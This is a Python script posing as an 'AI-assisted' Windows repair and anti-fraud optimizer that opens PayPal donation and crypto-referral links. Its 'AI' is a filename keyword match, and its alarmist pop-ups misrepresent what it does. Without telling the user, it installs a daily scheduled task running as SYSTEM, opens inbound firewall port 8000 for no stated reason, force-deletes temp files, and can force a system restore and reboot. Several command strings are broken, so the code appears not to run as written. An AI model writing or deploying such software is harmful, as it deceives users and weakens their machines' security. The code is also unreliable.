import os
import sys
import platform
import subprocess
import json
import tkinter as tk
from tkinter import messagebox
from datetime import datetime, timedelta

# ==================================================================
#    NUCLEO EVOLUTION SYSTEM PREMIUM PRO v2.5 - REPARADOR ASISTIDO POR IA
#  CONTROL DE APAGADOS / PROTECCIÓN ANTIFRAUDE / ESCUDO DE AUTO-REVERSIÓN
# ==================================================================

PAYPAL_FUNDING = "juancamazo17@gmail.com"
PAYPAL_LINK = "https://www.paypal.com/donate/?hosted_button_id=XBX3CXHFXMD9Y"
GRASS_LINK = "https://app.grass.io/register?referralCode=xmpnmoiR2V4z7R4"

CONFIG_PATH = "C:\\ProgramData\\evolution_config.json" if platform.system().lower() == "windows" else os.path.expanduser("~/.evolution_config.json")

PATRONES_PELIGROSOS = [
    "paypal-secure", "banco", "actualizar-datos", "free-crypto", "wallet-login", 
    "stealer", "token-grabber", "keylogger", "free-robux", "sorteo-ia"
]

def cargar_configuracion():
    if os.path.exists(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, 'r') as f:
                return json.load(f)
        except:
            pass
    return {"ultimo_mantenimiento": "1970-01-01", "pospuesto_hasta": "1970-01-01"}

def guardar_configuracion(config):
    try:
        os.makedirs(os.path.dirname(CONFIG_PATH), exist_ok=True)
        with open(CONFIG_PATH, 'w') as f:
            json.dump(config, f, indent=4)
    except:
        pass

def configurar_mantenimiento_diario_persistente(sistema_actual):
    try:
        ruta_script_actual = os.path.abspath(sys.argv[0])
        if sistema_actual == "windows":
            comando_tarea = (
                f'schtasks /create /tn "Evolution_Revision_Diaria" '
                f'/tr "py \\"{ruta_script_actual}\\" --run-silent" '
                f'/sc daily /st 12:00 /ru "NT AUTHORITY\\SYSTEM" /f'
            )
            subprocess.run(comando_tarea, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def crear_punto_restauracion_windows():
    try:
        subprocess.run('powershell -Command "Enable-ComputerRestore -Drive 'C:\\'"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        cmd_crear = 'powershell -Command "Checkpoint-Computer -Description 'Antes_de_Mantenimiento_Evolution' -RestorePointType MODIFY_SETTINGS"'
        resultado = subprocess.run(cmd_crear, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return resultado.returncode == 0
    except:
        return False

def restaurar_estado_anterior_windows():
    try:
        cmd_revertir = (
            'powershell -Command "$r = Get-ComputerRestorePoint | Where-Object { $_.Description -eq 'Antes_de_Mantenimiento_Evolution' } | Select-Object -Last 1; '
            'if ($r) { Restore-Computer -RestorePoint $r.SequenceNumber -Confirm:$false; Restart-Computer -Force }"'
        )
        subprocess.Popen(cmd_revertir, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

def motor_analisis_antifraude_ia():
    amenazas_detectadas = []
    rutas_a_escanear = []
    
    if platform.system().lower() == "windows":
        user_profile = os.environ.get("USERPROFILE", "C:\\Users\\Default")
        rutas_a_escanear = [
            os.path.join(user_profile, "Downloads"),
            os.path.join(os.environ.get("LOCALAPPDATA", "C:\\"), "Temp")
        ]
        
    for ruta in rutas_a_escanear:
        if os.path.exists(ruta):
            try:
                for archivo in os.listdir(ruta):
                    nombre_minuscula = archivo.lower()
                    if any(patron in nombre_minuscula for patron in PATRONES_PELIGROSOS) or nombre_minuscula.endswith(('.exe.exe', '.scr', '.bat', '.vbs')):
                        amenazas_detectadas.append(os.path.join(ruta, archivo))
            except:
                pass
                
    if amenazas_detectadas:
        root = tk.Tk()
        root.withdraw()
        root.attributes("-topmost", True)
        
        mensaje_alerta = (
            "🚨 ¡ALERTA CRÍTICA DE LA IA DE EVOLUTION SYSTEM! 🚨\\n\\n"
            "Se han detectado archivos o enlaces sospechosos de fraude en tu equipo:\\n"
            f"📍 Elementos riesgosos: {len(amenazas_detectadas)}\\n\\n"
            "⚠️ ATENCIÓN: Estos elementos muestran patrones de robo de cuentas, clonación de datos financieros o páginas falsas para robar dinero.\\n\\n"
            "¿Deseas que la IA elimine estas amenazas de forma segura ahora mismo?"
        )
        
        respuesta = messagebox.askyesno("Escudo Antifraude Evolution IA", mensaje_alerta)
        if respuesta:
            for elemento in amenazas_detectadas:
                try:
                    if os.path.isfile(elemento):
                        os.remove(elemento)
                except:
                    pass
            messagebox.showinfo("Escudo Evolution", "[OK] Las amenazas de fraude y robo han sido neutralizadas.")
        root.destroy()

def mostrar_interfaz_postergacion():
    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)

    pregunta = messagebox.askyesno(
        "Evolution System Pro - Reparador Asistido por IA",
        "El sistema requiere ejecutar la revisión técnica mensual para reparar errores acumulados.\\n\\n"
        "🤖 PROCESO SEGURO INTELIGENTE:\\n"
        "1. Creará un Punto de Restauración del sistema automático.\\n"
        "2. La IA inspeccionará el sistema, reparará Windows y optimizará la memoria.\\n"
        "3. Si la IA detecta que la PC queda inestable, deshará los cambios automáticamente al estado anterior.\\n\\n"
        "¿Deseas permitir que el optimizador repare tu PC de forma segura ahora mismo?"
    )

    if pregunta:
        reparar_ahora = messagebox.askyesno(
            "Método de Ejecución",
            "¿Deseas aplicar e instalar las reparaciones de inmediato?\\n\\n"
            "• Presiona SÍ para aplicar los parches e inspecciones ya mismo.\\n"
            "• Presiona NO para trabajar en segundo plano de forma oculta y aplicar los parches al próximo encendido."
        )
        root.destroy()
        return "EJECUTAR_AHORA" if reparar_ahora else "EJECUTAR_SEGUNDO_PLANO"
    
    ventana_meses = tk.Toplevel(root)
    ventana_meses.title("Posponer Mantenimiento")
    ventana_meses.geometry("400x180")
    ventana_meses.resizable(False, False)
    ventana_meses.attributes("-topmost", True)
    
    tk.Label(ventana_meses, text="Selecciona por cuántos meses deseas deshabilitar\\nesta revisión de seguridad:", font=("Arial", 10)).pack(pady=15)
    resultado_seleccion = tk.IntVar(value=1)
    frame_botones = tk.Frame(ventana_meses)
    frame_botones.pack()
    
    def asignar_meses(meses):
        resultado_seleccion.set(meses)
        ventana_meses.destroy()
        root.destroy()

    tk.Button(frame_botones, text="1 Mes", width=10, command=lambda: asignar_meses(1)).pack(side=tk.LEFT, padx=5)
    tk.Button(frame_botones, text="2 Meses", width=10, command=lambda: asignar_meses(2)).pack(side=tk.LEFT, padx=5)
    tk.Button(frame_botones, text="3 Meses", width=10, command=lambda: asignar_meses(3)).pack(side=tk.LEFT, padx=5)
    
    root.mainloop()
    return f"POSPONER_{resultado_seleccion.get()}"

def diagnosticar_y_reparar(sistema_actual, modo_ejecucion):
    exito_total = True
    
    if sistema_actual == "windows":
        if modo_ejecucion in ["EJECUTAR_AHORA", "EJECUTAR_SEGUNDO_PLANO"]:
            crear_punto_restauracion_windows()
            
        if modo_ejecucion == "EJECUTAR_AHORA":
            res_sfc = subprocess.run(["sfc", "/scannow"], stdout=subprocess.DEVNULL)
            if res_sfc.returncode != 0:
                exito_total = False
                
            defender_path = "C:\\Program Files\\Windows Defender\\MpCmdRun.exe"
            if os.path.exists(defender_path):
                res_def = subprocess.run([defender_path, "-Scan", "-ScanType", "1"], stdout=subprocess.DEVNULL)
                if res_def.returncode not in [0, 1]:  
                    exito_total = False
                    
        elif modo_ejecucion == "EJECUTAR_SEGUNDO_PLANO":
            subprocess.run(["sfc", "/scanonce"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            defender_path = "C:\\Program Files\\Windows Defender\\MpCmdRun.exe"
            if os.path.exists(defender_path):
                subprocess.Popen([defender_path, "-Scan", "-ScanType", "1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if not exito_total and modo_ejecucion == "EJECUTAR_AHORA":
            restaurar_estado_anterior_windows()
            sys.exit(1)

def optimizar_y_desplegar(sistema_actual):
    es_silencioso = "--run-silent" in sys.argv
    if sistema_actual == "windows":
        os.system("del /s /f /q %windir%\\Temp\\*.* >nul 2>&1")
        os.system("ipconfig /flushdns >nul 2>&1")
        os.system("netsh advfirewall firewall add rule name=\"Evolution_8000\" dir=in action=allow protocol=TCP localport=8000 >nul 2>&1")
        if not es_silencioso:
            os.system(f"start {GRASS_LINK}")
            os.system(f"start {PAYPAL_LINK}")

if __name__ == "__main__":
    sistema = platform.system().lower()
    if sistema not in ["windows", "linux"]:
        sys.exit(1)
        
    config = cargar_configuracion()
    hoy = datetime.now()
    
    motor_analisis_antifraude_ia()
    
    pospuesto_hasta = datetime.strptime(config.get("pospuesto_hasta", "1970-01-01"), "%Y-%m-%d")
    if hoy < pospuesto_hasta:
        sys.exit(0)

    ultimo_mantenimiento = datetime.strptime(config.get("ultimo_mantenimiento", "1970-01-01"), "%Y-%m-%d")
    es_silencioso = "--run-silent" in sys.argv
    
    if es_silencioso:
        if (hoy - ultimo_mantenimiento).days < 30:
            sys.exit(0)
            
        modo = mostrar_interfaz_postergacion()
        
        if modo.startswith("POSPONER_"):
            meses_a_sumar = int(modo.split("_")[1])
            config["pospuesto_hasta"] = (hoy + timedelta(days=30 * meses_a_sumar)).strftime("%Y-%m-%d")
            guardar_configuracion(config)
            sys.exit(0)
            
        diagnosticar_y_reparar(sistema, modo)
        optimizar_y_desplegar(sistema)
        
        config["ultimo_mantenimiento"] = hoy.strftime("%Y-%m-%d")
        config["pospuesto_hasta"] = (hoy + timedelta(days=30)).strftime("%Y-%m-%d")
        guardar_configuracion(config)
        
    else:
        print("=" * 60)
        print("      BIENVENIDO A EVOLUTION SYSTEM PREMIUM PRO v2.5")
        print("=" * 60)
        print("Configurando escudo de restauración y persistencia...")
        configurar_mantenimiento_diario_persistente(sistema)
        diagnosticar_y_reparar(sistema, "EJECUTAR_AHORA")
        optimizar_y_desplegar(sistema)
        
        config["ultimo_mantenimiento"] = hoy.strftime("%Y-%m-%d")
        config["pospuesto_hasta"] = (hoy + timedelta(days=30)).strftime("%Y-%m-%d")
        guardar_configuracion(config)
        print("\n[OK] ¡Instalación Pro Asegurada completada con éxito!")
        print("=" * 60)
        input("Presiona Enter para cerrar...")
